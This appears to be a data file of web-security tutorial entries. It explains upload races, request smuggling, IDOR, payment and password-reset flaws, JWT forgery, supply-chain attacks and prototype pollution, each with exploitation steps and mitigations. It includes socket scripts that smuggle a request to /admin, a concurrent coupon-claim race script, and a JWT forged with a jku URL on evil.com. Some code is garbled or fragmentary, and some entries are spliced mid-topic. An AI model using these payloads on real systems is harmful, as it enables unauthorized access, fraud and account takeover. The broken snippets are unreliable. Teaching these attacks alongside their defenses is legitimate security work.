tutorial.vulnerability: The server uses a "save first, check later" file handling flow and stores temporary files in a web-accessible directory, so an attacker can access the file directly by URL before the security check completes.
tutorial.exploitation: Exploitation flow: 1) Analyze the upload flow and response times 2) Determine the temporary file storage path 3) Prepare the malicious file (webshell) 4) Upload and access concurrently with multiple threads 5) Successfully execute the malicious code within the time window
tutorial.mitigation: 1) Store temporary files in a directory that is not web-accessible 2) Use random filenames 3) Check before saving (save to a non-web directory, then move only after the check passes) 4) Restrict execution permissions on the upload directory 5) Use file locks to ensure atomic operations

tutorial.overview: Path Traversal (Directory Traversal) is the most common filesystem-related vulnerability in web applications. tutorial.overview: Null Byte Injection exploits the C language convention of using \x00 as the string terminator. When the backend language (such as PHP<5.3.4) uses C functions under the hood to handle file paths, an attacker who injects %00 into a filename truncates everything after it, bypassing file extension validation. Modern languages have fixed this issue, but it is still effective on older systems.
tutorial.vulnerability: While processing file paths, the backend language first performs string operations in the high-level language (such as appending the .php suffix and checking the extension whitelist), then passes the result to a low-level C function to open the file. The C function stops reading at \x00, so the high-level language's security checks are bypassed.
tutorial.exploitation: Exploitation flow: 1) Detect the target PHP/Java version 2) Inject %00 into the filename 3) The whitelist check only sees the .jpg after the %00 4) When actually saving or including, %00 truncates it to .php 5) Access and verify

# Python POC - CL-CL smuggling
import socket

def smuggle_cl_cl(host, port):
    payload = (
        "POST / HTTP/1.1
"

"
        "Content-Length: 44
"   # The front end uses this CL

"    # The back end uses this CL

"

"

tutorial.overview: CL-CL (Content-Length - Content-Length) smuggling occurs when the front end and back end handle multiple Content-Length headers in an HTTP request inconsistently. RFC 7230 states that a request containing multiple CLs should not be accepted, but some server implementations pick one of them. If the front end uses the first CL and the back end uses the second (or vice versa), an attacker can inject a second complete HTTP request into the body of one request.
tutorial.vulnerability: When receiving a request containing multiple Content-Length headers, the front-end proxy and the back-end server pick different CL values. One side uses the first CL to read the request body while the other uses the second, so part of the data is treated as the next request.
tutorial.exploitation: Exploitation flow: 1) Confirm the front-end/back-end architecture 2) Send a dual-CL request to detect the discrepancy 3) Build a smuggling payload to inject a malicious request into the back-end queue 4) Use smuggling to bypass ACL/WAF and access restricted resources 5) Potentially escalate to request hijacking or cache poisoning
tutorial.mitigation: 1) RFC compliance: reject requests containing multiple Content-Length headers (return 400) 2) Unify CL parsing logic between front end and back end 3) Use HTTP/2 end to end 4) Have the front end normalize requests before forwarding 5) Disable TCP reuse via Connection: keep-alive

import socket

def te_cl_smuggle(host, port):
    # Front end (TE): reads until "0

" ends, so the whole payload is a single request
    # Back end (CL): reads only the bytes given by Content-Length, so the remaining bytes are a new request
    
    smuggled = "GET /admin HTTP/1.1
Host: {}

".format(host)
    
    payload = (
        "POST / HTTP/1.1
"
        "Host: {}
"
        "Content-Length: 4
"
        "Transfer-Encoding: chunked
"
        "
"
        "{}
"
        "{}"
        "0

"
    ).format(host, format(len(smuggled), "x"), smuggled)
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print(resp.decode(errors="ignore")[:500])
    s.close()

tutorial.overview: TE-CL smuggling occurs when the front-end proxy gives priority to Transfer-Encoding (chunked) while the back-end server gives priority to Content-Length. The front end forwards the complete data to the back end as chunked encoding, but the back end reads only the number of bytes given by CL, so the surplus data is left in the TCP buffer and is treated as the next independent request.
tutorial.vulnerability: The front end and the back end handle the priority of a simultaneous Transfer-Encoding and Content-Length inconsistently. RFC 7230 states that CL should be ignored when TE is present, but some back-end implementations use CL first.
tutorial.exploitation: Exploitation flow: 1) Detect the TE vs CL priority difference 2) Craft a request containing both TE and CL 3) The front end forwards the complete request per TE 4) The back end truncates per CL, and the remaining data becomes a smuggled request 5) The smuggled request bypasses ACL/WAF or hijacks other users' requests
tutorial.mitigation: 1) Unify TE/CL priority between front end and back end 2) Reject requests containing both TE and CL 3) Use HTTP/2 4) Disable TCP connection reuse to the back end 5) Have the front end normalize requests before forwarding

tutorial.overview: IDOR (Insecure Direct Object References) is the core vulnerability type of OWASP Top 10 A01:2021 Broken Access Control. When an application uses user-controlled input to access database objects directly (for example via user_id/order_id) without verifying that the current user is authorized, an attacker can enumerate parameter values to access other people's data, modify other people's information and even escalate their own privileges.
tutorial.vulnerability: The root cause of IDOR is that the back end lacks fine-grained authorization checks. Common scenarios: (1) the API queries the database directly with the ID from the URL path or query parameters; (2) the back end only verifies that the user is logged in but not that the resource belongs to them; (3) predictable auto-increment IDs are used instead of UUIDs; (4) the front end hides the entry point but the back end performs no check. The impact ranges from leaking a single user's personal information to bulk-exporting the entire database.
tutorial.exploitation: Exploitation steps: (1) log in with two test accounts A and B that have different privileges; (2) capture account A's API requests and record every endpoint containing an ID parameter; (3) replace the ID in A's requests with B's ID and see whether B's data is accessible; (4) automate enumeration of consecutive IDs and measure the success rate; (5) test vertical privilege escalation: use a regular user token to access administrator APIs. Recommended tools: Burp Suite Intruder and the Autorize extension can automate detection.
tutorial.mitigation: Remediation: (1) every back-end request must verify that the current user is authorized to access the requested resource (based on the user_id in the session, not on request parameters); (2) use UUIDs instead of auto-increment IDs to prevent enumeration; (3) implement an RBAC or ABAC access control model; (4) apply rate limiting to sensitive operations to prevent bulk enumeration; (5) use the Burp Autorize extension for automated IDOR detection during development.

execution.command:
import asyncio
import aiohttp

async def race_request(session, url, headers, data):
    async with session.post(url, headers=headers, json=data) as resp:
        return await resp.json()

async def main():
    url = "https://{TARGET}/api/coupon/claim"
    headers = {"Authorization": "Bearer {TOKEN}"}
    data = {"coupon_id": "COUPON001"}
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, headers, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.get("code") == 200)
        print(f"Total: {len(results)}, Success: {success}")

asyncio.run(main())

tutorial.overview: A race condition is a vulnerability that abuses the time window between the check and the use on the server side. When multiple concurrent requests arrive at the same time, the server may pass the check several times before deducting the resource, so the resource is consumed repeatedly. This class of vulnerability is common in e-commerce, finance and social scenarios involving limited resources.
tutorial.vulnerability: The root cause is that the server does not guarantee atomicity for critical business operations. A typical TOCTOU flow: (1) the server checks whether the user has already claimed the coupon, and it passes; (2) before the "already claimed" record is written, another request also passes the check; (3) both requests successfully perform the claim. The lack of row locks/optimistic locks at the database layer and of distributed locks/idempotency keys at the application layer are the main causes.
tutorial.exploitation: Exploitation methods: (1) use the gate mechanism of Burp Turbo Intruder or Python asyncio to send a large number of concurrent requests; (2) HTTP/2 multiplexing can achieve extremely high concurrency on a single connection; (3) watch whether the number of successes in the responses exceeds the expected limit; (4) focus on coupon claiming, balance withdrawal, points redemption, limited-stock flash sales, verification code validation and similar scenarios. The single packet attack is an efficient race condition technique introduced in 2023.
tutorial.mitigation: Defenses: (1) at the database layer use SELECT FOR UPDATE row locks or optimistic locking (version number mechanism); (2) at the application layer use a Redis distributed lock (SETNX) to ensure atomicity; (3) generate an idempotency key for every operation so repeated requests return the same result; (4) use a message queue to serialize critical operations; (5) perform the check and the execution inside one transaction to avoid the TOCTOU window.

tutorial.overview: Payment logic flaws are among the most severe business logic defects in e-commerce and financial systems. By intercepting and modifying the payment request parameters sent by the client (such as price, quantity, shipping fee and discount), or by forging the callback notification of a third-party payment platform, an attacker can achieve zero-cost purchases, profit from negative prices, bypass payment and so on. The financial loss from this class of vulnerability is usually direct.
tutorial.vulnerability: Root causes include: (1) the price is computed on the front end and not revalidated on the back end, trusting the amount submitted by the client; (2) no range validation on quantity and amount (negative, zero, oversized values); (3) the payment callback signature is not verified or the verification logic is flawed; (4) the coupon system does not restrict stacking; (5) there is no consistency check between the order amount and the amount actually paid. Many developers wrongly believe HTTPS encryption prevents tampering.
tutorial.exploitation: Exploitation methods: (1) use Burp Suite to intercept the checkout request and modify fields such as price/quantity/discount; (2) test boundary values: 0, negative numbers, very large values, floats, scientific notation; (3) check whether the payment callback endpoint can be reached and forged directly; (4) test coupon ID substitution and stacking; (5) check whether the order state machine allows skipping the payment step straight to "paid". Pay particular attention to mobile APIs, where validation is often weaker.
tutorial.mitigation: Defenses: (1) the server must re-query the price by product ID and recompute the total, never trusting the client-supplied amount; (2) apply strict range validation to all numeric parameters (>0 and <MAX); (3) the payment callback must have its signature verified and the amount matched against the order; (4) use database transactions to guarantee atomic coupon deduction; (5) enforce strict order state machine validation to prevent state jumps.

tutorial.overview: Password reset is one of the most critical authentication flows in a web application. An attacker can abuse logic flaws in the reset flow in several ways: Host header injection to steal the reset token, brute forcing a short verification code, manipulating the HTTP response to deceive the front end, and predicting the reset token due to weak randomness. Successful exploitation results in arbitrary account takeover.
tutorial.vulnerability: Common flaws: (1) the reset email/SMS builds the link URL from the Host header instead of a hardcoded domain; (2) the verification code has no expiry or attempt limit (a 4-digit code has only 10,000 possibilities); (3) the front end uses the code field in the response to decide the verification result instead of recording the state in the back-end session; (4) the reset token is generated by a predictable algorithm such as MD5(timestamp + email); (5) the token has no expiry or single-use restriction.
tutorial.exploitation: Attack paths: (1) Host injection: use Burp to change Host/X-Forwarded-Host to the attacker's domain, trigger the reset flow and receive the request carrying the token on the attacker's server; (2) verification code brute forcing: use Burp Intruder in Pitchfork mode to iterate 0000-9999; (3) response manipulation: use Burp to intercept the failure response and change it to success to deceive the front end; (4) token analysis: collect multiple tokens, analyze the pattern and then build the target user's token. These techniques can be combined.
tutorial.mitigation: Defensive measures: (1) hardcode the application domain in the reset link instead of taking it from HTTP headers; (2) use verification codes of 6 digits or more, with a 5 minute expiry and lockout after 5 wrong attempts; (3) record critical state changes (such as verification passed) only in the server-side session, never relying on the front end; (4) generate tokens with a CSPRNG such as crypto.randomBytes(32); (5) invalidate the token immediately after a single use and set a 15 minute expiry.

Common techniques include: the response leaking the verification code in plaintext, the code not being invalidated after use so it can be reused, removing the parameter to bypass validation, universal debug codes, and automatic OCR recognition. tutorial.overview: The JWT none algorithm attack (CVE-2015-2951) is the most classic JWT vulnerability. The JWT specification defines the "none" algorithm to mean that no signature verification is needed, originally intended for scenarios where integrity is already guaranteed by other means (such as TLS). However, many JWT libraries accept the algorithm specified by the client during verification, so when an attacker changes alg in the header to none and removes the signature, the server skips signature verification and trusts the payload content directly.
tutorial.vulnerability: Root causes: (1) the JWT library supports the none algorithm by default and it is not explicitly disabled at the application layer; (2) the verification logic uses the alg field supplied by the client in the header instead of the algorithm configured on the server; (3) some libraries match none case-sensitively, which can be bypassed with variants such as None/NONE; (4) the signature verification logic returns true directly when the signature is empty. This affects every application using an affected JWT library, and an attacker can forge any identity.
tutorial.exploitation: Exploitation steps: (1) obtain a valid JWT (for example by registering a regular account); (2) Base64-decode the Header and Payload; (3) change the alg field in the Header to none; (4) modify the user information in the Payload (for example change role to admin); (5) re-encode with Base64 and join as header.payload. (with an empty signature); (6) use the forged JWT to access high-privilege endpoints. Recommended: use jwt_tool -X a to automatically test all none variants.
tutorial.mitigation: Remediation: (1) Hard-code a server-side whitelist of allowed signature algorithms and explicitly disable none; (2) Verify using the algorithm configured on the server rather than the alg in the JWT Header; (3) Upgrade the JWT library to the latest version (modern libraries reject none by default); (4) Implement a JWT signing key rotation mechanism; (5) Add JWT token blacklisting to support logout/revocation.

tutorial.overview: JWT Key Confusion (Key Confusion / Algorithm Confusion) exploits the flaw of JWT libraries trusting the alg field in the Header when verifying signatures. When the server is configured for the RS256 (asymmetric) algorithm, the attacker changes alg to HS256 (symmetric), and the server then tries to verify the signature using the RSA public key as the HMAC secret. Since the RSA public key is public, the attacker can use it to compute a valid HMAC signature.
tutorial.vulnerability: Vulnerability chain: (1) The server verifies JWTs with RS256, signing with the RSA private key and verifying with the public key; (2) The RSA public key is usually obtainable from /.well-known/jwks.json or the certificate; (3) The attacker changes alg in the JWT Header to HS256; (4) The server verification logic uses the alg from the Header to decide the verification method; (5) HS256 is a symmetric algorithm and verification computes an HMAC with the "secret", which here is the RSA public key. The root cause is that algorithm selection rests with the client rather than the server.
tutorial.exploitation: Exploitation steps: (1) Confirm that the target JWT uses RS256/RS384/RS512; (2) Obtain the RSA public key from the JWKS endpoint, OAuth Discovery, the SSL certificate, and so on; (3) Change the JWT Header alg to HS256; (4) Sign the modified JWT using the obtained RSA public key as the HMAC secret; (5) Watch the public key format: a PEM, DER, or newline-stripped version may be required. The jwt_tool -X k command does it all in one step. Older PyJWT versions allowed this attack by default; newer versions have fixed it.
tutorial.mitigation: Defenses: (1) Hard-code the list of allowed algorithms on the server and do not use the alg from the Header during verification; (2) Use type-safe verification functions (for example specifying algorithms=["RS256"]); (3) Upgrade the JWT library to the latest version; (4) If JWKS is used, restrict key retrieval to trusted URLs and forbid jku/x5u redirects; (5) Rotate signing keys regularly.

tutorial.overview: JWT HMAC secret brute forcing targets JWT systems that use symmetric signing algorithms (HS256/HS384/HS512). Because HMAC algorithms use a shared secret for both signing and verification, if the secret is not strong enough (short password, common word, default value), an attacker can recover it through a dictionary attack or brute force and then use it to forge arbitrary JWT tokens for impersonation.
tutorial.vulnerability: Vulnerability conditions: (1) The JWT uses an HMAC algorithm such as HS256; (2) The signing secret is a weak password (for example secret, 123456, the company name); (3) The secret is not rotated regularly; (4) A default example secret from tools such as jwt.io (your-256-bit-secret) is used in production. The JWT specification recommends that an HS256 secret be a random value of at least 256 bits (32 bytes), but in practice many systems use short human-readable passwords. hashcat can test billions of HS256 secrets per second on a consumer GPU.
tutorial.exploitation: Exploitation flow: (1) Obtain a valid JWT sample from a login response or cookie; (2) Decode it and confirm the HS256/384/512 algorithm; (3) Use hashcat -m 16500 with a large dictionary (rockyou.txt) for GPU-accelerated brute forcing; (4) Or use jwt_tool -C -d to quickly test common weak secrets; (5) After cracking, sign a JWT with any payload using that secret; (6) An RTX 4090 can run through the rockyou dictionary (14 million entries) in minutes.
tutorial.mitigation: Defenses: (1) Use a cryptographically secure random secret of at least 256 bits (openssl rand -hex 32); (2) Prefer asymmetric algorithms (RS256/ES256) to avoid shared-secret problems; (3) Rotate JWT signing keys regularly; (4) Never ship default/example secrets to production; (5) Enforce JWT expiration (exp) and a blacklist mechanism to limit the impact of leaked tokens.

execution.title: 2. Generate the attacker key pair
execution.command:
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64

# Generate an RSA key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Export in PEM format
with open("attacker_private.pem", "wb") as f:
    f.write(private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    ))

# Generate the public key in JWKS format
numbers = public_key.public_numbers()
jwks = {"keys": [{"kty": "RSA", "kid": "attacker-key-1",
    "n": base64.urlsafe_b64encode(numbers.n.to_bytes(256, "big")).rstrip(b"=").decode(),
    "e": base64.urlsafe_b64encode(numbers.e.to_bytes(3, "big")).rstrip(b"=").decode(),
    "use": "sig", "alg": "RS256"}]}

with open("jwks.json", "w") as f:
    json.dump(jwks, f)
execution.description: Generate the attacker's RSA key pair and build the JWKS file

    attacker_key = f.read()

forged = jwt.encode(

    attacker_key,
    algorithm="RS256",
    headers={"jku": "http://evil.com:8080/jwks.json", "kid": "attacker-key-1"}
)

tutorial.overview: JKU (JWK Set URL) and X5U (X.509 URL) are optional parameters in the JWT Header that specify the source URL of the signature verification key. If the server fetches the public key from the jku/x5u in the Header when verifying a JWT without restricting the URL source, the attacker can point that parameter at a server they control, making the server verify an attacker-signed JWT with the attacker's public key and achieving perfect token forgery.
tutorial.vulnerability: Root cause: (1) The server trusts the URL specified by the jku/x5u parameter in the JWT Header; (2) No URL whitelist or domain restriction is enforced; (3) Even where domain validation exists, it can be bypassed via open redirects, subdomain takeover, and similar techniques; (4) Some implementations even allow HTTP (non-HTTPS) jku URLs. The attacker can generate their own RSA key pair, sign the JWT with the private key, and host the corresponding JWKS public key file on the public internet.
tutorial.exploitation: Full attack chain: (1) Decode the target JWT and confirm it uses RS256 with a jku field in the Header; (2) Generate the attacker RSA key pair; (3) Convert the public key to JWKS format and host it on the attacker server; (4) Change the jku in the JWT Header to point at the attacker server; (5) Sign the tampered Payload with the attacker private key; (6) Send the forged JWT, and the server fetches the public key from the attacker URL and verifies it successfully. If a domain whitelist exists, bypass it with an open redirect or subdomain takeover.
tutorial.mitigation: Defenses: (1) Disable the jku/x5u Header parameters and hard-code the key source in the server configuration; (2) If jku must be used, enforce a strict URL whitelist and do not follow redirects; (3) Pin the JWKS public key in the server configuration instead of fetching it dynamically; (4) Implement a mapping from kid to known keys and reject unknown kids; (5) Audit the JWT library configuration regularly to ensure client-supplied key sources are not trusted.

tutorial.overview: Package name typosquatting is one of the most common techniques in supply chain attacks. Attackers register malicious packages in NPM/PyPI and other package managers with names closely resembling popular packages, exploiting developer typos during installation. The 2022 ua-parser-js incident and the colors/faker poisoning incident both had large-scale impact, proving how serious this attack surface is.

tutorial.overview: CI/CD pipeline poisoning is the highest-impact technique in supply chain attacks. Automation systems such as GitHub Actions, Jenkins, and GitLab CI usually hold high-value Secrets such as deployment keys and cloud credentials. In the 2021 Codecov incident, attackers tampered with a CI script and stole environment variables from thousands of companies. pull_request_target and expression injection are the most common attack surfaces in GitHub Actions.
tutorial.vulnerability: Causes: (1) The pull_request_target event runs forked code in the base repository context with access to Secrets; (2) GitHub Actions ${{}} expressions insert user input (PR titles/issue comments) unsafely into shell commands; (3) Developers do not audit third-party Actions, and a malicious Action can steal all Secrets; (4) Build logs may leak secrets (even masked values can be bypassed through encoding); (5) The CI environment usually runs as root with unrestricted network access.
tutorial.exploitation: Attack chain: (1) Search the target repository's .github/workflows directory and analyze the workflow configuration; (2) Identify workflows using pull_request_target, which can be triggered by a PR and have Secrets access; (3) Craft a malicious PR that abuses the checkout step to obtain the base repository Secrets; (4) If pull_request_target is absent, try expression injection (via the PR title/body); (5) Use the obtained Secrets to attack the deployment targets further (for example an AWS key leading to cloud service takeover).
tutorial.mitigation: Defenses: (1) Avoid pull_request_target, and if it must be used do not check out PR code; (2) Pass all user input through environment variables rather than interpolating directly in ${{}}; (3) Pin third-party Actions to a specific SHA rather than a tag (for example actions/checkout@a1b2c3d); (4) Enable GitHub Required Reviewers to block unreviewed workflow changes; (5) Use OpenSSF Scorecard to assess the project's CI security; (6) Least privilege: configure the minimum necessary permissions for GITHUB_TOKEN.

tutorial.overview: Dependency Confusion was discovered and disclosed by security researcher Alex Birsan in 2021 and affected tech giants such as Apple, Microsoft, and PayPal. The attack abuses the behavior of package managers (NPM/PyPI/RubyGems) that prefer the higher version from the public registry when resolving packages of the same name. The attacker only needs to know the target's internal package names to publish a higher-versioned malicious package of the same name in the public registry and wait for a hit.
tutorial.vulnerability: Root cause: (1) Package managers such as NPM query both public and private registries by default and prefer the higher version number; (2) Many companies do not correctly configure the registry scope mapping in .npmrc; (3) Internal package names can be discovered through leaked lock files, JS source, GitHub searches, error messages, and similar; (4) CI/CD pipelines usually run npm install automatically and have network access; (5) Loose version ranges in package.json (such as ^1.0.0) make it easier to hit the higher-versioned attack package.
tutorial.exploitation: Attack flow: (1) Discover the target's internal package names through JS source, leaked lock files, GitHub searches, and similar; (2) Confirm the package name is not registered in the public NPM registry; (3) Create a public package of the same name with the version set to 99.x.x; (4) Embed DNS/HTTP callback code in the package (used to confirm a hit, performing no damage); (5) Wait for the target CI/CD pipeline or a developer to run npm install and trigger the installation; (6) Confirm the attack succeeded through the DNS/HTTP callback and collect target environment information.
tutorial.mitigation: Remediation: (1) Configure the scope in .npmrc to point at the private registry: @company:registry=https://private.registry.com; (2) Register all internal package names in the private registry (even those only used privately); (3) Use npm's --prefer-offline and package-lock.json to pin versions; (4) Enable npm audit and Dependabot to detect anomalous dependency changes; (5) Disable public registry access in the CI/CD pipeline or use a proxy; (6) Use tools such as Artifactory to configure a virtual repository that centrally manages the package resolution policy.

tutorial.overview: Prototype Pollution is a vulnerability class specific to JavaScript that abuses the JS prototype inheritance mechanism. When an application merges user input into an object with an unsafe deep merge (lodash.merge/deepmerge and similar), the attacker can pollute Object.prototype through the __proto__ property, affecting every object created afterwards. Combined with gadget chains in specific template engines (EJS/Pug), it can achieve RCE.
tutorial.vulnerability: Root cause: (1) Almost every object in JavaScript inherits from Object.prototype; (2) Recursive merge functions do not filter dangerous keys such as __proto__/constructor; (3) Popular libraries such as lodash (<4.17.12), jQuery, and merge-deep contain this vulnerability; (4) Server-side Node.js using template engines such as EJS/Pug has known RCE gadget chains; (5) JSON.parse does not filter the __proto__ key. The affected APIs are usually PATCH/PUT style configuration update endpoints.
tutorial.exploitation: Exploitation steps: (1) Identify API endpoints that accept JSON input and perform object merges (such as PUT /settings, PATCH /profile); (2) Send a __proto__ pollution test payload to confirm the vulnerability exists; (3) Choose a gadget chain based on the target stack: outputFunctionName/escapeFunction for EJS, the block property for Pug; (4) Build an RCE payload and inject it into __proto__; (5) Visit a page rendered by that template engine to trigger code execution; (6) If the template engine cannot be identified, try the DoS and information disclosure gadgets first.
tutorial.mitigation: Defenses: (1) Use Object.create(null) to create safe prototype-less objects; (2) Filter the __proto__, constructor, and prototype keys in merge functions; (3) Upgrade lodash to 4.17.21+ to fix the merge vulnerability; (4) Use Map instead of plain objects to store user input; (5) Apply JSON Schema validation to JSON input and reject requests containing __proto__; (6) Enable the --disable-proto=throw Node.js flag to disable __proto__ access.

tutorial.overview: Client-side prototype pollution is a vulnerability triggered in the browser through URL parameters, postMessage, and similar channels. Unlike the server side, client-side pollution usually needs a "gadget", that is a place in the code that reads the polluted property, to cause real harm (such as XSS). Known gadget chains exist in popular frontend libraries such as jQuery, Lodash, and DOMPurify. Finding and exploiting these vulnerabilities requires a deep understanding of JS prototype inheritance and the internals of frontend libraries.
tutorial.vulnerability: Causes: (1) A custom frontend URL parameter parser converting ?a[b]=c into a nested object without filtering __proto__; (2) Older versions of third-party libraries such as qs and query-string contain prototype pollution; (3) Deep copy functions such as jQuery $.extend(true,...) and lodash.merge propagate the pollution; (4) The configuration of security libraries such as DOMPurify can be overwritten by prototype pollution and rendered ineffective; (5) The default property systems of frontend frameworks (Vue/React) may read polluted values.
tutorial.exploitation: Exploitation steps: (1) Check whether the target page's JS code contains a custom query parser or uses a known vulnerable library; (2) Send __proto__[test]=1 through a URL parameter and verify in the console whether ({}).test returns 1; (3) If the pollution succeeds, search the page code for gadgets, that is code locations reading specific property names; (4) Common gadgets: jQuery html() reads innerHTML, DOMPurify reads ALLOWED_ATTR, lodash template reads sourceURL; (5) Build a complete POC URL combining the pollution source and the gadget to trigger XSS.
tutorial.mitigation: Defenses: (1) Use a safe URL parameter parsing library (qs@6.10.0+ is fixed); (2) Object.freeze(Object.prototype) to freeze the prototype and prevent pollution (mind compatibility); (3) Upgrade jQuery, Lodash, and similar libraries to the latest versions; (4) Use Object.create(null) when creating objects; (5) Enforce whitelist validation on URL parameter names and reject parameters containing __proto__/constructor; (6) Use CSP (Content-Security-Policy) as the last line of defense against XSS.

tutorial.overview: Combining prototype pollution with NoSQL injection is an advanced exploitation technique. Prototype pollution alone may need a template engine gadget to reach RCE, and NoSQL injection alone may be blocked by operator filtering. Combined, however, prototype pollution can bypass the query validation logic and inject malicious MongoDB operators into a query that should have been safe, achieving authentication bypass and data disclosure. This shows the power of vulnerability chains in real attacks.
tutorial.vulnerability: Root cause: (1) A Node.js backend using functions such as lodash.merge to handle configuration/settings update requests contains prototype pollution; (2) MongoDB query construction does not strictly type check the input (objects are allowed as query values); (3) The backend operator filtering only checks own properties and not properties inherited through the prototype chain; (4) Frameworks such as Express.js automatically convert the URL query parameter password[$ne]= into the nested object {password:{$ne:""}}; (5) The MongoDB $where operator allows arbitrary JavaScript execution.
tutorial.exploitation: Combined exploitation steps: (1) First test plain NoSQL injection by sending $ne/$gt operators and observing response differences; (2) If a WAF or validation blocks it, look for a prototype pollution entry point (such as PUT /settings, PATCH /config); (3) Use prototype pollution to inject $where or to overwrite the properties of the query validation logic; (4) Send the login request again and use the polluted prototype chain to bypass the operator check; (5) After obtaining an administrator token, enumerate user data further; (6) Use $regex blind injection to extract password hashes or plaintext passwords.
tutorial.mitigation: Defenses: (1) Strictly type check all JSON input (use schema validation libraries such as Joi/Zod); (2) Use libraries such as mongo-sanitize to filter $ operators out of queries; (3) Disable the MongoDB $where operator (mongod --setParameter disableJavaScript=true); (4) Fix prototype pollution: upgrade lodash / use Object.create(null) / filter the __proto__ key; (5) Store passwords with bcrypt so hashes obtained after an authentication bypass cannot be used directly; (6) Parameterize queries: use mongoose .find().where() instead of passing objects directly.
